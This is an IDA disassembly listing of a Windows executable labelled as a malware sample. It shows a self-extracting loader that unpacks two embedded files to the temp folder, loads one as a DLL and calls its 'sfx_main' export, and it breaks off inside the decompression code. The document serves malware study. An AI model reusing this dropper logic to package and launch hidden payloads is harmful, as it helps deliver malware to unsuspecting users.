;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	0CC8A9E275447EB78AE81CDB410C444E
; Input	CRC32 :	B6F5DA5D

; File Name   :	C:\Users\farhadi\Desktop\509_Malware\0cc8a9e275447eb78ae81cdb410c444e
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 000024A2 (   9378.)
; Section size in file		: 00002600 (   9728.)
; Offset to raw	data for section: 00000400
; Flags	60000020: Text Executable Readable
; Alignment	: default
; OS type	  :  MS	Windows
; Application type:  Executable	32bit

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 401000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing

; =============== S U B	R O U T	I N E =======================================


sub_401000	proc near		; CODE XREF: WinMain(x,x,x,x)+5Dp
		push	esi
		mov	esi, ecx
		push	dword ptr [esi+8] ; lpLibFileName
		call	ds:LoadLibraryW
		mov	[esi+10h], eax
		test	eax, eax
		jz	short loc_401024
		push	offset ProcName	; "sfx_main"
		push	eax		; hModule
		call	ds:GetProcAddress
		push	esi
		call	eax
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_401024:				; CODE XREF: sub_401000+11j
		push	0FFFFFF9Fh
		pop	eax
		pop	esi
		retn
sub_401000	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_401029(LPVOID lpBuffer, DWORD nNumberOfBytesToRead,	LPDWORD	lpNumberOfBytesRead)
sub_401029	proc near		; CODE XREF: sub_4012D1+2Ep

lpBuffer	= dword	ptr  4
nNumberOfBytesToRead= dword ptr	 8
lpNumberOfBytesRead= dword ptr	0Ch

		push	0		; lpOverlapped
		push	[esp+4+lpNumberOfBytesRead] ; lpNumberOfBytesRead
		push	[esp+8+nNumberOfBytesToRead] ; nNumberOfBytesToRead
		push	[esp+0Ch+lpBuffer] ; lpBuffer
		push	dword ptr [ecx]	; hFile
		call	ds:ReadFile
		neg	eax
		sbb	eax, eax
		inc	eax
		retn	0Ch
sub_401029	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_401047(LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten)
sub_401047	proc near		; CODE XREF: sub_4012D1+64p

lpBuffer	= dword	ptr  4
nNumberOfBytesToWrite= dword ptr  8
lpNumberOfBytesWritten=	dword ptr  0Ch

		push	0		; lpOverlapped
		push	[esp+4+lpNumberOfBytesWritten] ; lpNumberOfBytesWritten
		push	[esp+8+nNumberOfBytesToWrite] ;	nNumberOfBytesToWrite
		push	[esp+0Ch+lpBuffer] ; lpBuffer
		push	dword ptr [ecx]	; hFile
		call	ds:WriteFile
		neg	eax
		sbb	eax, eax
		inc	eax
		retn	0Ch
sub_401047	endp


; =============== S U B	R O U T	I N E =======================================


sub_401065	proc near		; DATA XREF: sub_4010BE+E4o
		xor	eax, eax
		retn	4
sub_401065	endp

; ---------------------------------------------------------------------------
; START	OF FUNCTION CHUNK FOR sub_40348C

loc_40106A:				; CODE XREF: sub_40348C+11j
		push	esi
		mov	esi, ecx
		push	dword ptr [esi+4] ; void *
		mov	dword ptr [esi], offset	off_4040C0
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx
		push	dword ptr [esi+10h] ; hLibModule
		call	ds:FreeLibrary
		push	dword ptr [esi+8] ; lpFileName
		call	ds:DeleteFileW
		push	dword ptr [esi+8] ; Memory
		call	free
		pop	ecx
		pop	esi
		retn
; END OF FUNCTION CHUNK	FOR sub_40348C

; =============== S U B	R O U T	I N E =======================================


sub_401099	proc near		; DATA XREF: .rdata:004040CCo
		mov	eax, [ecx+4]
		retn
sub_401099	endp


; =============== S U B	R O U T	I N E =======================================


sub_40109D	proc near		; DATA XREF: .rdata:004040C8o
		mov	eax, [ecx+0Ch]
		retn
sub_40109D	endp


; =============== S U B	R O U T	I N E =======================================


sub_4010A1	proc near		; DATA XREF: .rdata:off_4040C0o
		mov	eax, 10000h
		retn
sub_4010A1	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_4010A7(LPWSTR lpTempFileName)
sub_4010A7	proc near		; CODE XREF: sub_4010BE+9Bp
					; sub_4010BE+105p

lpTempFileName	= dword	ptr  4

		push	[esp+lpTempFileName] ; lpTempFileName
		push	0		; uUnique
		push	offset PrefixString ; lpPrefixString
		push	dword ptr [ecx+4] ; lpPathName
		call	ds:GetTempFileNameW
		retn	4
sub_4010A7	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4010BE	proc near		; CODE XREF: sub_401230+20j

FileName	= word ptr -254h
Buffer		= dword	ptr -4Ch
lDistanceToMove	= dword	ptr -48h
var_3C		= dword	ptr -3Ch
var_34		= dword	ptr -34h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_20		= dword	ptr -20h
var_18		= dword	ptr -18h
NumberOfBytesRead= dword ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
hObject		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 254h
		push	ebx
		push	esi
		push	edi
		push	104h		; nSize
		lea	eax, [ebp+FileName]
		push	eax		; lpFilename
		xor	edi, edi
		push	edi		; lpModuleName
		mov	esi, ecx
		call	ds:GetModuleHandleW
		push	eax		; hModule
		call	ds:GetModuleFileNameW
		mov	ebx, ds:CreateFileW
		push	edi		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	3		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	1		; dwShareMode
		push	80000000h	; dwDesiredAccess
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	ebx ; CreateFileW
		push	edi		; dwMoveMethod
		push	edi		; lpDistanceToMoveHigh
		push	1Ch		; lDistanceToMove
		push	eax		; hFile
		mov	[ebp+hObject], eax
		call	ds:SetFilePointer
		push	edi		; lpOverlapped
		lea	eax, [ebp+NumberOfBytesRead]
		push	eax		; lpNumberOfBytesRead
		push	1Ch		; nNumberOfBytesToRead
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		push	[ebp+hObject]	; hFile
		call	ds:ReadFile
		cmp	[ebp+Buffer], 46587253h
		jz	short loc_401142
		push	[ebp+hObject]	; hObject
		call	ds:CloseHandle
		push	0FFFFFF9Dh
		jmp	loc_40122A
; ---------------------------------------------------------------------------

loc_401142:				; CODE XREF: sub_4010BE+72j
		push	edi		; dwMoveMethod
		push	edi		; lpDistanceToMoveHigh
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		push	[ebp+hObject]	; hFile
		call	ds:SetFilePointer
		lea	eax, [ebp+FileName]
		push	eax		; lpTempFileName
		mov	ecx, esi
		call	sub_4010A7
		lea	eax, [ebp+FileName]
		push	eax		; Str
		call	_wcsdup
		pop	ecx
		push	edi		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	5		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	1		; dwShareMode
		mov	[esi+8], eax
		push	40000000h	; dwDesiredAccess
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	ebx ; CreateFileW
		mov	[ebp+var_8], eax
		mov	[ebp+var_2C], eax
		mov	eax, [ebp+hObject]
		lea	ecx, [ebp+var_30]
		mov	[ebp+var_30], eax
		mov	eax, [esi]
		push	ecx
		mov	ecx, esi
		mov	[ebp+var_28], 1000h
		mov	[ebp+var_20], offset sub_401065
		call	dword ptr [eax+4]
		push	edi		; dwMoveMethod
		push	edi		; lpDistanceToMoveHigh
		push	[ebp+var_3C]	; lDistanceToMove
		push	[ebp+hObject]	; hFile
		call	ds:SetFilePointer
		lea	eax, [ebp+FileName]
		push	eax		; lpTempFileName
		mov	ecx, esi
		call	sub_4010A7
		lea	eax, [ebp+FileName]
		push	eax		; Str
		call	_wcsdup
		pop	ecx
		push	edi		; hTemplateFile
		push	80h		; dwFlagsAndAttributes
		push	5		; dwCreationDisposition
		push	edi		; lpSecurityAttributes
		push	1		; dwShareMode
		mov	[esi+0Ch], eax
		push	40000000h	; dwDesiredAccess
		lea	eax, [ebp+FileName]
		push	eax		; lpFileName
		call	ebx ; CreateFileW
		lea	ecx, [ebp+var_30]
		mov	ebx, eax
		mov	eax, [esi]
		push	ecx
		mov	ecx, esi
		mov	[ebp+var_2C], ebx
		call	dword ptr [eax+4]
		push	[ebp+hObject]	; hObject
		mov	esi, ds:CloseHandle
		mov	[ebp+var_C], eax
		call	esi ; CloseHandle
		push	[ebp+var_8]	; hObject
		call	esi ; CloseHandle
		push	ebx		; hObject
		call	esi ; CloseHandle
		cmp	[ebp+var_C], edi
		jnz	short loc_401228
		mov	eax, [ebp+var_18]
		cmp	eax, [ebp+var_34]
		jnz	short loc_401228
		xor	eax, eax
		jmp	short loc_40122B
; ---------------------------------------------------------------------------

loc_401228:				; CODE XREF: sub_4010BE+15Cj
					; sub_4010BE+164j
		push	0FFFFFF9Eh

loc_40122A:				; CODE XREF: sub_4010BE+7Fj
		pop	eax

loc_40122B:				; CODE XREF: sub_4010BE+168j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4010BE	endp


; =============== S U B	R O U T	I N E =======================================


sub_401230	proc near		; CODE XREF: WinMain(x,x,x,x)+Fp
		push	esi
		push	208h		; unsigned int
		mov	esi, ecx
		call	??2@YAPAXI@Z	; operator new(uint)
		pop	ecx
		push	eax		; lpBuffer
		push	104h		; nBufferLength
		mov	[esi+4], eax
		call	ds:GetTempPathW
		mov	ecx, esi
		pop	esi
		jmp	sub_4010BE
sub_401230	endp


; =============== S U B	R O U T	I N E =======================================


sub_401255	proc near		; CODE XREF: sub_401382+3p
					; sub_40139E+62p ...
		push	esi
		mov	esi, ecx
		lea	eax, [esi+28h]
		push	eax
		mov	dword ptr [esi], offset	off_4040D8
		call	sub_4026D2
		push	dword ptr [esi+1Ch] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		push	dword ptr [esi+20h] ; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 0Ch
		pop	esi
		retn
sub_401255	endp


; =============== S U B	R O U T	I N E =======================================


sub_40127C	proc near		; CODE XREF: sub_40139E+45p

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		push	38h
		lea	eax, [esi+28h]
		push	offset dword_4040DC
		push	eax
		call	sub_4027FB
		add	esp, 0Ch
		test	eax, eax
		jz	short loc_40129A
		xor	eax, eax
		jmp	short loc_4012CD
; ---------------------------------------------------------------------------

loc_40129A:				; CODE XREF: sub_40127C+18j
		push	edi
		mov	edi, [esp+8+arg_0]
		push	edi		; unsigned int
		mov	[esi+24h], edi
		call	??2@YAPAXI@Z	; operator new(uint)
		push	edi		; unsigned int
		mov	[esi+1Ch], eax
		call	??2@YAPAXI@Z	; operator new(uint)
		and	dword ptr [esi+2Ch], 0
		pop	ecx
		mov	[esi+20h], eax
		mov	eax, [esi+1Ch]
		pop	ecx
		xor	ecx, ecx
		test	eax, eax
		setnz	cl
		mov	[esi+34h], eax
		mov	[esi+38h], edi
		pop	edi
		mov	eax, ecx

loc_4012CD:				; CODE XREF: sub_40127C+1Cj
		pop	esi
		retn	4
sub_40127C	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4012D1	proc near		; CODE XREF: sub_40139E+52p

var_8		= dword	ptr -8
NumberOfBytesWritten= dword ptr	-4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+1Ch], 0
		jnz	short loc_4012E7
		xor	eax, eax
		inc	eax
		jmp	loc_40137A
; ---------------------------------------------------------------------------

loc_4012E7:				; CODE XREF: sub_4012D1+Cj
		push	ebx
		xor	ebx, ebx
		inc	ebx
		push	edi

loc_4012EC:				; CODE XREF: sub_4012D1+99j
		cmp	dword ptr [esi+2Ch], 0
		jnz	short loc_401314
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesRead
		push	dword ptr [esi+24h] ; nNumberOfBytesToRead
		lea	ecx, [esi+14h]
		push	dword ptr [esi+20h] ; lpBuffer
		call	sub_401029
		test	eax, eax
		jnz	short loc_40137D
		mov	eax, [ebp+NumberOfBytesWritten]
		mov	[esi+2Ch], eax
		mov	eax, [esi+20h]
		mov	[esi+28h], eax

loc_401314:				; CODE XREF: sub_4012D1+1Fj
		lea	eax, [esi+28h]
		push	2
		push	eax
		call	sub_402812
		mov	edi, [esi+24h]
		sub	edi, [esi+38h]
		pop	ecx
		pop	ecx
		mov	[ebp+var_8], eax
		lea	eax, [ebp+NumberOfBytesWritten]
		push	eax		; lpNumberOfBytesWritten
		push	edi		; nNumberOfBytesToWrite
		push	dword ptr [esi+1Ch] ; lpBuffer
		lea	ecx, [esi+18h]
		call	sub_401047
		test	eax, eax
		jnz	short loc_40137D
		push	edi
		push	dword ptr [esi+1Ch]
		push	ebx
		call	sub_401486
		mov	ecx, [esi+30h]
		mov	ebx, eax
		lea	eax, [esi+4]
		add	esp, 0Ch
		push	eax
		mov	[eax+8], ecx
		call	dword ptr [eax+0Ch]
		cmp	[ebp+var_8], 0
		mov	eax, [esi+1Ch]
		mov	[esi+34h], eax
		mov	eax, [esi+24h]
		mov	[esi+38h], eax
		jz	short loc_4012EC
		xor	eax, eax
		cmp	[ebp+var_8], 1
		mov	[esi+58h], ebx
		setnz	al

loc_401378:				; CODE XREF: sub_4012D1+AFj
		pop	edi
		pop	ebx

loc_40137A:				; CODE XREF: sub_4012D1+11j
		pop	esi
		leave
		retn
; ---------------------------------------------------------------------------

loc_40137D:				; CODE XREF: sub_4012D1+35j
					; sub_4012D1+6Bj
		xor	eax, eax
		inc	eax
		jmp	short loc_401378
sub_4012D1	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_401382(void *, char)
sub_401382	proc near		; DATA XREF: .rdata:off_4040D8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	sub_401255
		test	[esp+4+arg_0], 1
		jz	short loc_401398
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_401398:				; CODE XREF: sub_401382+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_401382	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40139E	proc near		; DATA XREF: .rdata:004040C4o

var_60		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= dword	ptr -58h
var_50		= dword	ptr -50h
var_4C		= dword	ptr -4Ch
var_48		= dword	ptr -48h
var_44		= dword	ptr -44h
var_40		= dword	ptr -40h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_8		= dword	ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		xor	eax, eax
		mov	[ebp+var_44], eax
		mov	[ebp+var_40], eax
		mov	[ebp+var_10], eax
		mov	[ebp+var_18], eax
		mov	[ebp+var_14], eax
		push	esi
		mov	esi, [ebp+arg_0]
		mov	eax, [esi+14h]
		push	dword ptr [esi+8]
		mov	[ebp+var_5C], eax
		mov	eax, [esi+10h]
		mov	[ebp+var_50], eax
		mov	eax, [esi+4]
		mov	[ebp+var_48], eax
		mov	eax, [esi+0Ch]
		mov	[ebp+var_58], eax
		mov	eax, [esi]
		lea	ecx, [ebp+var_60]
		mov	[ebp+var_60], offset off_4040D8
		mov	[ebp+var_4C], eax
		call	sub_40127C
		lea	ecx, [ebp+var_60]
		test	eax, eax
		jz	short loc_401411
		push	edi
		call	sub_4012D1
		mov	edi, eax
		mov	eax, [ebp+var_8]
		lea	ecx, [ebp+var_60]
		mov	[esi+18h], eax
		call	sub_401255
		mov	eax, edi
		neg	eax
		sbb	eax, eax
		and	eax, 0FFFFFFA0h
		pop	edi
		jmp	short loc_401419
; ---------------------------------------------------------------------------

loc_401411:				; CODE XREF: sub_40139E+4Fj
		call	sub_401255
		push	0FFFFFFA0h
		pop	eax

loc_401419:				; CODE XREF: sub_40139E+71j
		pop	esi
		leave
		retn	4
sub_40139E	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
_WinMain@16	proc near		; CODE XREF: start+12Fp

Caption		= word ptr -3Ch
Dest		= word ptr -2Eh
Dst		= byte ptr -2Ch
hInstance	= dword	ptr  8
hPrevInstance	= dword	ptr  0Ch
lpCmdLine	= dword	ptr  10h
nShowCmd	= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		push	ebx
		push	esi
		mov	esi, offset off_4050B4
		mov	ecx, esi
		call	sub_401230
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_401479
		push	edi
		mov	esi, offset aError ; "Error: "
		lea	edi, [ebp+Caption]
		movsd
		movsd
		movsd
		push	2Ch		; Size
		lea	eax, [ebp+Dst]
		push	0		; Val
		push	eax		; Dst
		movsd
		call	memset
		push	0Ah		; Radix
		lea	eax, [ebp+Dest]
		push	eax		; Dest
		push	ebx		; Value
		call	_itow
		add	esp, 18h
		push	10h		; uType
		lea	eax, [ebp+Caption]
		push	eax		; lpCaption
		push	offset Text	; "Failed to init."
		push	0		; hWnd
		call	ds:MessageBoxW
		mov	eax, ebx
		pop	edi
		jmp	short loc_401480
; ---------------------------------------------------------------------------

loc_401479:				; CODE XREF: WinMain(x,x,x,x)+18j
		mov	ecx, esi
		call	sub_401000

loc_401480:				; CODE XREF: WinMain(x,x,x,x)+59j
		pop	esi
		pop	ebx
		leave
		retn	10h
_WinMain@16	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401486	proc near		; CODE XREF: sub_4012D1+72p
					; DATA XREF: sub_402718+A2o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_4]
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		movzx	esi, di
		shr	edi, 10h
		test	ecx, ecx
		jnz	short loc_4014A3
		xor	eax, eax
		inc	eax
		jmp	loc_401592
; ---------------------------------------------------------------------------

loc_4014A3:				; CODE XREF: sub_401486+13j
		cmp	[ebp+arg_8], 0
		jbe	loc_40158B
		push	ebx

loc_4014AE:				; CODE XREF: sub_401486+FEj
		mov	edx, 15B0h
		cmp	[ebp+arg_8], edx
		jnb	short loc_4014BB
		mov	edx, [ebp+arg_8]

loc_4014BB:				; CODE XREF: sub_401486+30j
		sub	[ebp+arg_8], edx
		cmp	edx, 10h
		jl	loc_40155A
		mov	eax, edx
		shr	eax, 4
		mov	ebx, eax
		imul	ebx, -10h
		add	edx, ebx

loc_4014D3:				; CODE XREF: sub_401486+CEj
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		add	edi, esi
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	esi, ebx
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	edi, esi
		add	esi, ebx
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	edi, esi
		add	esi, ebx
		inc	ecx
		movzx	ebx, byte ptr [ecx]
		add	edi, esi
		add	esi, ebx
		inc	ecx
		add	edi, esi
		dec	eax
		jnz	loc_4014D3

loc_40155A:				; CODE XREF: sub_401486+3Bj
		test	edx, edx
		jz	short loc_401569

loc_40155E:				; CODE XREF: sub_401486+E1j
		movzx	eax, byte ptr [ecx]
		add	esi, eax
		inc	ecx
		add	edi, esi
		dec	edx
		jnz	short loc_40155E

loc_401569:				; CODE XREF: sub_401486+D6j
		mov	eax, esi
		xor	edx, edx
		mov	ebx, 0FFF1h
		mov	esi, ebx
		div	esi
		mov	eax, edi
		mov	esi, edx
		xor	edx, edx
		div	ebx
		cmp	[ebp+arg_8], 0
		mov	edi, edx
		ja	loc_4014AE
		pop	ebx

loc_40158B:				; CODE XREF: sub_401486+21j
		mov	eax, edi
		shl	eax, 10h
		or	eax, esi

loc_401592:				; CODE XREF: sub_401486+18j
		pop	edi
		pop	esi
		pop	ebp
		retn
sub_401486	endp


; =============== S U B	R O U T	I N E =======================================


sub_401596	proc near		; CODE XREF: sub_401615+53p
					; sub_401E22+10p ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	ebx
		push	esi
		mov	esi, [esp+8+arg_0]
		xor	ebx, ebx
		push	edi
		cmp	[esi+34h], ebx
		jz	short loc_4015AD
		mov	eax, [esi+38h]
		mov	ecx, [esp+0Ch+arg_8]
		mov	[ecx], eax

loc_4015AD:				; CODE XREF: sub_401596+Cj
		mov	eax, [esi]
		mov	edi, [esp+0Ch+arg_4]
		cmp	eax, 4
		jz	short loc_4015BD
		cmp	eax, 5
		jnz	short loc_4015C8

loc_4015BD:				; CODE XREF: sub_401596+20j
		push	dword ptr [esi+0Ch]
		push	dword ptr [edi+28h]
		call	dword ptr [edi+24h]
		pop	ecx
		pop	ecx

loc_4015C8:				; CODE XREF: sub_401596+25j
		cmp	dword ptr [esi], 6
		jnz	short loc_4015EB
		push	edi
		push	dword ptr [esi+0Ch]
		call	sub_4023A7
		push	edi
		push	dword ptr [esi+8]
		call	sub_402B76
		push	edi
		push	dword ptr [esi+4]
		call	sub_402B76
		add	esp, 18h

loc_4015EB:				; CODE XREF: sub_401596+35j
		mov	eax, [esi+24h]
		mov	[esi+30h], eax
		mov	[esi+2Ch], eax
		mov	eax, [esi+34h]
		mov	[esi], ebx
		mov	[esi+1Ch], ebx
		mov	[esi+20h], ebx
		cmp	eax, ebx
		jz	short loc_401611
		push	ebx
		push	ebx
		push	ebx
		call	eax
		mov	[esi+38h], eax
		add	esp, 0Ch
		mov	[edi+30h], eax

loc_401611:				; CODE XREF: sub_401596+6Bj
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_401596	endp


; =============== S U B	R O U T	I N E =======================================


sub_401615	proc near		; CODE XREF: sub_402718+A9p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		push	3Ch
		push	1
		push	dword ptr [edi+28h]
		call	dword ptr [edi+20h]
		mov	esi, eax
		add	esp, 0Ch
		test	esi, esi
		jz	short loc_401673
		push	ebx
		mov	ebx, [esp+0Ch+arg_8]
		push	ebx
		push	1
		push	dword ptr [edi+28h]
		call	dword ptr [edi+20h]
		add	esp, 0Ch
		mov	[esi+24h], eax
		test	eax, eax
		jnz	short loc_401653
		push	esi
		push	dword ptr [edi+28h]
		call	dword ptr [edi+24h]
		pop	ecx
		pop	ecx
		xor	eax, eax
		jmp	short loc_401672
; ---------------------------------------------------------------------------

loc_401653:				; CODE XREF: sub_401615+2Fj
		and	dword ptr [esi], 0
		add	eax, ebx
		mov	[esi+28h], eax
		mov	eax, [esp+0Ch+arg_4]
		mov	[esi+34h], eax
		lea	eax, [esi+38h]
		push	eax
		push	edi
		push	esi
		call	sub_401596
		add	esp, 0Ch
		mov	eax, esi

loc_401672:				; CODE XREF: sub_401615+3Cj
		pop	ebx

loc_401673:				; CODE XREF: sub_401615+17j
		pop	edi
		pop	esi
		retn
sub_401615	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_401676	proc near		; CODE XREF: sub_402812+105p

var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
Size		= dword	ptr -10h
var_C		= dword	ptr -0Ch
Dst		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		mov	edx, [esi+30h]
		push	edi
		mov	edi, [ebp+arg_4]
		mov	eax, [edi+4]
		mov	ebx, [edi]
		mov	[ebp+var_4], eax
		mov	eax, [esi+20h]
		mov	[ebp+arg_0], eax
		mov	eax, [esi+1Ch]
		mov	[ebp+arg_4], eax
		mov	eax, [esi+2Ch]
		mov	[ebp+Dst], edx
		cmp	edx, eax
		jnb	short loc_4016B0
		sub	eax, edx
		dec	eax
		mov	ecx, eax
		mov	[ebp+var_C], eax
		jmp	short loc_4016B8
; ---------------------------------------------------------------------------

loc_4016B0:				; CODE XREF: sub_401676+2Ej
		mov	ecx, [esi+28h]
		sub	ecx, edx
		mov	[ebp+var_C], ecx

loc_4016B8:				; CODE XREF: sub_401676+38j
		mov	eax, [esi]
		cmp	eax, 9		; switch 10 cases
		jbe	short loc_4016F7

loc_4016BF:				; CODE XREF: sub_401676+669j
		push	0FFFFFFFEh	; jumptable 004016F7 default case

loc_4016C1:				; CODE XREF: sub_401676+688j
					; sub_401676+69Cj ...
		mov	eax, [ebp+arg_0]
		mov	[esi+20h], eax
		mov	eax, [ebp+arg_4]

loc_4016CA:				; CODE XREF: sub_401676+F3j
		mov	[esi+1Ch], eax
		mov	eax, [ebp+var_4]
		mov	[edi+4], eax

loc_4016D3:				; CODE XREF: sub_401676+681j
		mov	eax, ebx
		sub	eax, [edi]
		mov	[edi], ebx
		add	[edi+8], eax
		mov	eax, [ebp+Dst]
		mov	[esi+30h], eax

loc_4016E2:				; CODE XREF: sub_401676+6E5j
		push	edi
		push	esi
		call	sub_40315C
		add	esp, 0Ch

loc_4016EC:				; CODE XREF: sub_401676+73Dj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
; ---------------------------------------------------------------------------

loc_4016F1:				; CODE XREF: sub_401676+663j
		mov	ecx, [ebp+var_C]
		mov	edx, [ebp+Dst]

loc_4016F7:				; CODE XREF: sub_401676+47j
		jmp	ds:off_401DFA[eax*4] ; switch jump
; ---------------------------------------------------------------------------

loc_4016FE:				; CODE XREF: sub_401676+ADj
		cmp	[ebp+var_4], 0
		jz	loc_401CE4
		movzx	eax, byte ptr [ebx]
		mov	ecx, [ebp+arg_4]
		and	[ebp+arg_8], 0
		dec	[ebp+var_4]
		shl	eax, cl
		or	[ebp+arg_0], eax
		inc	ebx
		add	[ebp+arg_4], 8

loc_40171F:				; CODE XREF: sub_401676:loc_4016F7j
					; DATA XREF: .text:off_401DFAo
		cmp	[ebp+arg_4], 3	; jumptable 004016F7 case 0
		jb	short loc_4016FE
		mov	eax, [ebp+arg_0]
		and	eax, 7
		mov	ecx, eax
		and	ecx, 1
		shr	eax, 1
		sub	eax, 0
		mov	[esi+18h], ecx
		jz	loc_4017CD
		dec	eax
		jz	short loc_40177D
		dec	eax
		jz	short loc_40176E
		dec	eax
		jnz	loc_401CD4
		mov	eax, [ebp+arg_0]
		shr	eax, 3
		mov	dword ptr [esi], 9
		mov	dword ptr [edi+18h], offset aInvalidBlockTy ; "invalid block type"
		mov	[esi+20h], eax
		mov	eax, [ebp+arg_4]
		add	eax, 0FFFFFFFDh
		push	0FFFFFFFDh
		jmp	loc_4016CA
; ---------------------------------------------------------------------------

loc_40176E:				; CODE XREF: sub_401676+CCj
		shr	[ebp+arg_0], 3
		push	3
		pop	eax
		sub	[ebp+arg_4], eax
		jmp	loc_401844
; ---------------------------------------------------------------------------

loc_40177D:				; CODE XREF: sub_401676+C9j
		lea	eax, [ebp+var_1C]
		push	eax
		lea	eax, [ebp+var_20]
		push	eax
		lea	eax, [ebp+var_24]
		push	eax
		lea	eax, [ebp+var_28]
		push	eax
		call	sub_403048
		push	edi
		push	[ebp+var_1C]
		push	[ebp+var_20]
		push	[ebp+var_24]
		push	[ebp+var_28]
		call	sub_401E4F
		add	esp, 24h
		mov	[esi+0Ch], eax
		test	eax, eax
		jz	loc_401CFC
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		shr	[ebp+arg_0], 3
		sub	[ebp+arg_4], 3
		mov	dword ptr [esi], 6
		jmp	loc_401CD4
